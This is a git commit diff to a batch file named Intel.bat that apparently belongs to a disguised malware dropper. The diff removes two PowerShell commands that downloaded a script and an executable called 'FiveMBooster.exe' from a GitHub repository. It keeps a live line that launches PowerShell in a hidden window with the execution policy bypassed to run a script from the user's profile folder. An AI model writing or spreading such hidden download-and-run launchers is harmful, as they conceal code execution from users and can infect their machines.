d18ce31e7fc05b5ca1f96a186aae3a0e610f85f8
Alinsmekeru <113843071+Alinsmekeru@users.noreply.github.com>
2024-09-14 18:46:55 +0300

    Update Intel.bat

--- Intel.bat
+++ Intel.bat
@@ -1,3 +1,1 @@
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/auto.ps1' -O auto.ps1
-Invoke-WebRequest -Uri 'https://github.com/Alinsmekeru/Intel3/blob/main/FiveMBooster.exe' -O FiveMBooster.exe
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File ""%userprofile%\Intel\Intel.ps1""'}"
